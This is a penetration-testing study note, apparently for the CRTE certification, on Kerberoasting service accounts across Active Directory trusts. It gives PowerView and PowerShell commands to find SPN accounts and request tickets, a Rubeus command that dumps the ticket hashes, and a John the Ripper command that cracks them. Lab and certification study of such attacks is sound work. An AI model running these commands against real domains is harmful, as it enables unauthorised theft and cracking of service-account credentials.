# Methodology
> 1. Enumerate what user account running as a service account we want to kerberoast.
> 2. Make sure it's not a honey pot account.
> 3. Make sure is a user made account, we don't want machine accounts since they have long passwords.
> 5. Kerberoast the user account.
> 7. Crack the ticket. 

>**ℹ️ Info:**
>Accross domain/forests trusts there is no need to use `/opsec`, AES256 is not used by default so no downgrade encryption needed!

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView
**Find users that have an SPN set:**
```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
```

**Request a TGS accross trusts:**
```powershell
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken - ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## Rubeus
**Request a TGS accross trusts:**
```cmd
Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```


# Ticket Crack
https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win64.zip

**Using John**:
```cmd
john-1.9.0-jumbo-1-win64\run\john.exe -- wordlist=rockyou.txt euhashes.txt
```